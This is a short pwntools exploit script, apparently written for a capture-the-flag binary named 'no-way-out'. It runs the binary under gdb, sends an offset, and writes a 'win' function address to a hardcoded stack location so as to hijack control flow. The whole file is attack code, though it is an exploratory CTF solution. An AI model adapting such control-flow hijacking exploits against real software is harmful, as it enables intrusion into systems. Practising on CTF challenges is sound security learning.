from pwn import *

elf = ELF('no-way-out')
context.binary = elf
p = gdb.debug(elf.path, gdbscript='b *main+141')
libc = ELF('./libc-2.27.so')
#p = process(elf.path)

win = p64(0x40125d)

offset = 0#- int(0x18)

#writable_range = 0x00007fffffffdc90 - 0x00007fffffffdcc8

address = 0x00007ffccb64d560 + offset

p.recv()

log.warn('offset is : ' + str(offset) + ', writing at : ' + str(hex(address)))

p.sendline(str(offset).encode())

p.recv()

log.warn(b'writing : ' + win)

p.sendline(win)

p.interactive()
